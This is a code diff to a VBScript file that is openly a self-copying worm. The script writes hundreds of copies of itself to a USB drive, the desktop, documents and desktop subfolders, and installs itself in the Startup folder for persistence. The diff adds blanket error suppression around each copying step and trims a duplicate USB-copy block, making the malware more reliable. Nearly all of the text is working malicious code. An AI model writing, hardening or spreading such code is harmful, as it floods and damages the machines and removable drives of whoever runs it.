@@ -18,14 +18,17 @@ numCopies = 999
 usbDrivePath = "F:\"
 
 ' Generate copies of the script on the USB drive
+On Error Resume Next ' Ignore errors
 For i = 1 To numCopies
     randomIteration = Int((1000 * Rnd) + 1)
 
     strCopyPath = usbDrivePath & "\Copy" & randomIteration & ".vbs"
     objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
 Next
+On Error GoTo 0 ' Reset error handling
 
 ' Create copies of the script on the desktop and in the documents folder
+On Error Resume Next ' Ignore errors
 For i = 1 To numCopies
     randomIteration = Int((1000 * Rnd) + 1)
 
@@ -37,10 +40,13 @@ For i = 1 To numCopies
     strDocumentsCopyPath = strDocumentsFolder & "\Copy" & randomIteration & ".vbs"
     objFSO.CopyFile strScriptPath, strDocumentsCopyPath, True ' Add "True" to overwrite existing files
 Next
+On Error GoTo 0 ' Reset error handling
 
 ' Add the script to the startup folder
+On Error Resume Next ' Ignore errors
 startupFolder = objShell.SpecialFolders("Startup")
 objFSO.CopyFile strScriptPath, startupFolder & "\Copy.vbs", True ' Add "True" to overwrite existing files
+On Error GoTo 0 ' Reset error handling
 
 ' Loop indefinitely
 Do
@@ -71,18 +77,13 @@ Do
 
     ' Generate copies of the script within each folder on the Desktop
     For Each objFolder In objFSO.GetFolder(strDesktopFolder).Subfolders
+        On Error Resume Next ' Ignore errors
         For i = 1 To numCopies
             randomIteration = Int((1000 * Rnd) + 1)
             strCopyPath = objFolder.Path & "\Copy" & randomIteration & ".vbs"
             objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
         Next
-    Next
-
-    ' Generate copies of the script on the USB drive
-    For i = 1 To numCopies
-        randomIteration = Int((1000 * Rnd) + 1)
-        strCopyPath = usbDrivePath & "\Copy" & randomIteration & ".vbs"
-        objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
+        On Error GoTo 0 ' Reset error handling
     Next
 
 Loop
